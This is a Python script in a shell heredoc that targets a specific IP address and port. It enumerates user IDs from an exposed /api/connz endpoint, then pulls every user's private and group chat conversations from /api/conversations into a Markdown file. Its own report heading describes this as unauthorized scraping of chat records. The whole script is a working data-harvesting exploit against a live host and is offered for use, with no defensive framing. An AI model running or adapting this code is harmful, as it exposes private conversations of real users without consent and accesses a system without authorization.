python - <<'PY'
import json, datetime, urllib.request, sys

BASE = "http://43.198.164.35:5300"
TS   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUT  = f"43.198.164.35_聊天记录_{TS}.md"

def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=30) as r:
            return json.load(r)
    except Exception as e:
        return {"__err__": str(e)}

# --- 1) 从 /api/connz 提取所有 uid（兼容多种返回结构）---
def to_list(d):
    if isinstance(d, list): return d
    if isinstance(d, dict):
        for k in ("data","list","users","conns","conversations","result","rows","items"):
            if isinstance(d.get(k), list): return d[k]
    return []

raw = get("/api/connz")
uids, seen = [], set()
for it in to_list(raw):
    uid = None
    if isinstance(it, dict):
        for k in ("uid","user_id","userId","userid","u_id","id"):
            if it.get(k) is not None: uid = it[k]; break
    elif isinstance(it, (str, int)):
        uid = it
    if uid is not None and uid not in seen:
        seen.add(uid); uids.append(uid)

# --- 2) 拉每个 uid 的会话 ---
def conv_items(c):
    if isinstance(c, list): return [x for x in c if isinstance(x, dict)]
    if isinstance(c, dict):
        for k in ("data","list","conversations","convs"):
            if isinstance(c.get(k), list): return [x for x in c[k] if isinstance(x, dict)]
    return []

def pick(items, t):
    return [c for c in items if str(c.get("channel_type", "")) == str(t)]

def j(obj):
    return "```json\n" + json.dumps(obj, ensure_ascii=False, indent=2) + "```"

# --- 3) 生成 Markdown ---
lines = []
lines.append("# 43.198.164.35:5300 未授权聊天记录抓取报告")
lines.append("")
lines.append(f"- 目标: `{BASE}`")
lines.append(f"- 拉取时间: {datetime.datetime.now().isoformat(timespec='seconds')}")
lines.append(f"- uid 总数: **{len(uids)}**")
if uids:
    lines.append(f"- uid 列表: { ', '.join(map(str, uids)) }")
lines.append("")
lines.append("> channel_type: 1 = 私聊, 2 = 群聊")
lines.append("")

total_p = total_g = 0
for uid in uids:
    data = get(f"/api/conversations?uid={uid}")
    items = conv_items(data)
    private, group = pick(items, 1), pick(items, 2)
    total_p += len(private); total_g += len(group)
    lines.append(f"## uid: `{uid}`")
    lines.append(f"- 私聊会话: {len(private)}")
    lines.append(f"- 群聊会话: {len(group)}")
    if "conversations" in json.dumps(data).lower() and not items:
        lines.append("> ⚠️ 未能按结构识别会话，原始响应如下")
        lines.append(j(data))
    if private:
        lines.append(""); lines.append("### 私聊 (channel_type=1)")
        for c in private: lines.append(j(c)); lines.append("")
    if group:
        lines.append(""); lines.append("### 群聊 (channel_type=2)")
        for c in group: lines.append(j(c)); lines.append("")
    lines.append("")
    print(f"[+] uid={uid}  私聊={len(private)} 群聊={len(group)}", file=sys.stderr)

lines.insert(4, f"- 私聊会话合计: **{total_p}**   群聊会话合计: **{total_g}**")
lines.insert(6, "")  # 补空行（可选）

open(OUT, "w", encoding="utf-8").write("\n".join(lines))
print(f"\n[+] 完成: 共 {len(uids)} 个 uid, 私聊 {total_p}, 群聊 {total_g}")
print(f"[+] 已保存到: {OUT}", file=sys.stderr)
PY
